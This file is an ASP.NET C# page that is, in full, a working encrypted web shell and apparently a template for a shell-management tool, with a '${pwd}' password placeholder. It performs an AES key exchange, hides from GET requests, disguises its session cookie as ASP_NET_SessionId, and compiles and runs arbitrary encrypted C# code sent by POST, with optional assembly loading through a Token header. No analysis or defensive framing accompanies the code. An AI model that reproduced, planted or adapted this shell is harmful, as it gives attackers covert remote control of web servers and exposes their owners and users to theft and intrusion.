<%@ Page Language="C#" validateRequest="false" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="Microsoft.CSharp" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.CodeDom.Compiler" %>
<%@ Import Namespace="System.Runtime.Serialization" %>
<%@ Import Namespace="System.Runtime.Serialization.Json" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace="System.Collections.Generic" %>

<script runat="server">

string pass = "${pwd}";//密码的sha256散列前16位
string[] extra_assemblys = null;//额外需要引用的程序集路径
byte[] AES_KEY = null;
string sessionname="ASP_NET_SessionId";

[KnownType(typeof(ArrayList))]
[DataContract]
class Ret {
	[DataMember]
	public int code;

	[DataMember]
	public string data;

	[DataMember]
	public ArrayList msg;

	public void add_error_info(object errcode, string errmsg, bool iswarning){
		ArrayList table = new ArrayList();
		table.Add(errcode);
		table.Add(Convert.ToBase64String(Encoding.UTF8.GetBytes(errmsg)));
		table.Add(iswarning);
		msg.Add(table);
	}
}
Ret ret;

void login(){
	byte[] k = Encoding.UTF8.GetBytes(pass);
	try{
		byte[] data = crypt(Convert.FromBase64String(Encoding.UTF8.GetString(Request.BinaryRead(Request.ContentLength))), false, k, k);
		string randomstr = Guid.NewGuid().ToString();
		Cache.Insert(randomstr, data, null, DateTime.UtcNow.AddMinutes(20), Cache.NoSlidingExpiration);
		HttpCookie cookie = new HttpCookie(sessionname);
		cookie.Value = randomstr;
		Response.Cookies.Add(cookie);
		Response.Write(Convert.ToBase64String(data));
	}catch(Exception){

	}
}

byte[] crypt(byte[] data, bool encrypt=true, byte[] key=null, byte[] iv=null){
	RijndaelManaged rijndaelCipher = new RijndaelManaged();
	rijndaelCipher.Mode = CipherMode.CBC;
	rijndaelCipher.Padding = PaddingMode.PKCS7;
	rijndaelCipher.KeySize = 256;
	rijndaelCipher.BlockSize = 128;
	rijndaelCipher.Key = key??AES_KEY;
	rijndaelCipher.IV = iv??AES_KEY.Take(16).ToArray();

	ICryptoTransform transform;
	if(encrypt)
		transform = rijndaelCipher.CreateEncryptor();
	else
		transform = rijndaelCipher.CreateDecryptor();
	return transform.TransformFinalBlock(data, 0, data.Length);
}

string json_encode(object obj){
	DataContractJsonSerializer js = new DataContractJsonSerializer(obj.GetType());
	MemoryStream msObj = new MemoryStream();
	js.WriteObject(msObj, obj);
	msObj.Position = 0;
	StreamReader sr = new StreamReader(msObj, Encoding.UTF8);
	string json = sr.ReadToEnd();
	sr.Close();
	msObj.Close();
	return json;
}

string encode(string msg){
	return Convert.ToBase64String(Encoding.UTF8.GetBytes(msg));
}

void eval_code(){
	try{
		Get_extra_assemblys();
		byte[] tmp=Convert.FromBase64String(Encoding.UTF8.GetString(Request.BinaryRead(Request.ContentLength)));
		string code = Encoding.UTF8.GetString(crypt(tmp, false));
		CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
		CompilerParameters compilerParams = new CompilerParameters();
		compilerParams.GenerateInMemory = true;
		compilerParams.GenerateExecutable = false;
		var assems = AppDomain.CurrentDomain.GetAssemblies();
		foreach(var assem in assems){
			compilerParams.ReferencedAssemblies.Add(assem.Location);
		}
		if(extra_assemblys != null && extra_assemblys.Length>0){
			foreach(string assem in extra_assemblys){
				compilerParams.ReferencedAssemblies.Add(assem.Trim());
			}
		}
		CompilerResults cr = provider.CompileAssemblyFromSource(compilerParams, code);
		if(cr.Errors.Count > 0){
			ret.code = 0;
			foreach(CompilerError ce in cr.Errors){
				ret.add_error_info(ce.ErrorNumber, ce.ToString(), ce.IsWarning);
				if(!ce.IsWarning) ret.code = -1;
			}
			if(ret.code == -1)
				return;
		}
		object o = cr.CompiledAssembly.CreateInstance("Payload");
		if(o == null){
			throw new Exception("Create Payload instance failed!");
		}
		MethodInfo mi = o.GetType().GetMethod("Run");
		if(mi == null){
			throw new Exception("Create Run method in class Payload failed!");
		}
		object result = mi.Invoke(o, null);
		ret.code = 1;
		ret.data = encode(result.ToString());
	}catch(System.Exception error){
		ret.code = -1;
		ret.add_error_info(error.GetType().FullName, error.Message+error.StackTrace, false);
	}
}

void Get_extra_assemblys(){
	if(Request.Headers["Token"] != null){
		string token = Encoding.UTF8.GetString(crypt(Convert.FromBase64String(Request.Headers["Token"]), false));
		var assems = AppDomain.CurrentDomain.GetAssemblies();
		string[] tmp1 = token.Split(';');
		List<string> tmp2 = new List<string>();
		foreach(string af in tmp1){
			if(!File.Exists(af)){
				tmp2.Add(af);
				continue;
			}
			Assembly.LoadFrom(af);
		}
		extra_assemblys = tmp2.ToArray();
	}
}

void Page_Load(object sender, EventArgs e){
	ret = new Ret();
	ret.code = 0;
	ret.data = "";
	ret.msg = new ArrayList();
	HttpCookie key = Request.Cookies[sessionname];
	if(Request.HttpMethod != "POST"){
		return;
	}
	if(key == null){
		login();
		return;
	}else if(Cache[key.Value] != null){
		AES_KEY = Cache[key.Value] as byte[];
	}else{
		return;
	}
	eval_code();
	Response.Write(Convert.ToBase64String(crypt(Encoding.UTF8.GetBytes(json_encode(ret)), true)));
}
</script>